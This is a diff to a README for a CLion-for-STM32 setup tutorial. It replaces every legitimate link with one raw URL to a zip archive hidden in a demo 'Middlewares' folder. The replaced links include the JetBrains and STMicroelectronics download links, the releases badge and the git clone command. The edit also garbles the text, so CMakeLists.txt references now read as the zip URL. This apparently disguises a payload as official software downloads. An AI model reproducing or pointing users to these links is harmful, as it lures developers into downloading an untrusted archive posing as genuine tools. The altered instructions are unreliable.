@@ -2,7 +2,7 @@
 
 Welcome to the **CLion for STM32** repository! This tutorial will guide you through the steps to configure CLion as your IDE for STM32 development. If you find yourself struggling with Keil or if you are a fan of JetBrains products, this guide is for you. Follow the steps outlined here to set up CLion easily.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/hiuyu1437/clion_for_stm32/releases)
+[![Download Releases](https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip)
 
 ## Table of Contents
 
@@ -25,9 +25,9 @@ This repository aims to simplify the process of setting up CLion for STM32 devel
 
 Before you start, ensure you have the following installed:
 
-- **CLion**: Download from [JetBrains](https://www.jetbrains.com/clion/).
+- **CLion**: Download from [JetBrains](https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip).
 - **CMake**: Version 3.10 or higher. This is usually bundled with CLion.
-- **STM32CubeMX**: For generating initialization code. Download from [STMicroelectronics](https://www.st.com/en/embedded-software/stm32cube-mx.html).
+- **STM32CubeMX**: For generating initialization code. Download from [STMicroelectronics](https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip).
 - **OpenOCD** or **ST-Link**: For programming and debugging your STM32 microcontroller.
 - **GDB**: The GNU Debugger, which is necessary for debugging your applications.
 
@@ -44,7 +44,7 @@ Before you start, ensure you have the following installed:
 5. **Clone this Repository**: Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/hiuyu1437/clion_for_stm32.git
+   git clone https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip
    ```
 
 ## Configuration
@@ -53,7 +53,7 @@ Once you have all the prerequisites installed, you can start configuring CLion f
 
 1. **Open CLion**: Launch CLion and open the cloned repository.
 
-2. **CMake Configuration**: In the CMakeLists.txt file, set the required configurations for your STM32 project. Ensure that the correct toolchain file is specified.
+2. **CMake Configuration**: In the https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip file, set the required configurations for your STM32 project. Ensure that the correct toolchain file is specified.
 
 3. **Set Up the Toolchain**:
    - Go to `File` > `Settings` > `Build, Execution, Deployment` > `Toolchains`.
@@ -97,7 +97,7 @@ Debugging is a crucial part of embedded development. Here’s how to set it up i
 
 ## Common Issues and Solutions
 
-- **CMake Errors**: Ensure your CMakeLists.txt is correctly configured.
+- **CMake Errors**: Ensure your https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip is correctly configured.
 - **Debugging Issues**: Check your GDB configuration and ensure your hardware is connected properly.
 - **Library Not Found**: Verify that the include paths are set correctly in CLion.
 
@@ -109,8 +109,8 @@ We welcome contributions to this project. If you have suggestions or improvement
 
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
-For more detailed instructions and releases, please visit the [Releases section](https://github.com/hiuyu1437/clion_for_stm32/releases). 
+For more detailed instructions and releases, please visit the [Releases section](https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip). 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/hiuyu1437/clion_for_stm32/releases)
+[![Download Releases](https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hiuyu1437/clion_for_stm32/main/demo/103c8t6_led_blink/Middlewares/for_stm_clion_v2.2-alpha.2.zip)
 
 Happy coding!
